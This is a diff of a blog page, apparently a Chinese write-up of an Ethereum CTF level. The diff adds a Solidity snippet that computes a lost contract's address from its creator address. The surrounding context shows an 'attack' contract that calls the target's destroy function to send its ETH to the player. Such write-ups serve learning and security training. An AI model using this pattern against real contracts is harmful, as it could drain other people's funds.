@@ -27,7 +27,7 @@
 <meta property="og:image" content="http://xiaoxiaoxiaoxiaocai.github.io.com/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-29%20222116.png">
 <meta property="og:image" content="http://xiaoxiaoxiaoxiaocai.github.io.com/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-29%20222139.png">
 <meta property="article:published_time" content="2023-11-27T08:28:03.000Z">
-<meta property="article:modified_time" content="2024-04-22T11:58:01.731Z">
+<meta property="article:modified_time" content="2024-04-23T06:20:49.251Z">
 <meta property="article:author" content="xiaocai">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://xiaoxiaoxiaoxiaocai.github.io.com/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-27%20175711.png">
@@ -234,7 +234,7 @@
         
         
         
-          115 mins
+          117 mins
         
       </span>
     
@@ -382,7 +382,12 @@
 
 
 <p>只需找到合约地址实行自毁函数将eth转会玩家地址就行。</p>
-<h5 id="寻找地址"><a href="#寻找地址" class="headerlink" title="寻找地址"></a>寻找地址</h5><p>通过etherscan进行查找</p>
+<h5 id="寻找地址"><a href="#寻找地址" class="headerlink" title="寻找地址"></a>寻找地址</h5><ol>
+<li><p>通过etherscan进行查找</p>
+</li>
+<li><p>计算得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>contract Hack &#123;<br>    function getdd(address target) public view returns (address) &#123;<br>        address data = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), target, bytes1(0x01))))));<br>        return data; //0x8B7bAdf88cBaE3F8Ed26Df75475133E4972bB606<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li>
+</ol>
 <h4 id="Attack-1"><a href="#Attack-1" class="headerlink" title="Attack"></a>Attack</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>contract attack &#123;<br>    address payable target; //合约地址<br>    address payable myaddr; //player<br><br>    constructor(address payable _addr, address payable _myaddr) public &#123;<br>        target=_addr;<br>        myaddr=_myaddr;<br>    &#125;<br>    <br>    function exploit() public&#123;<br>        target.call(abi.encodeWithSignature(&quot;destroy(address)&quot;,myaddr));<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>部署后运行 exploit函数就行。</p>
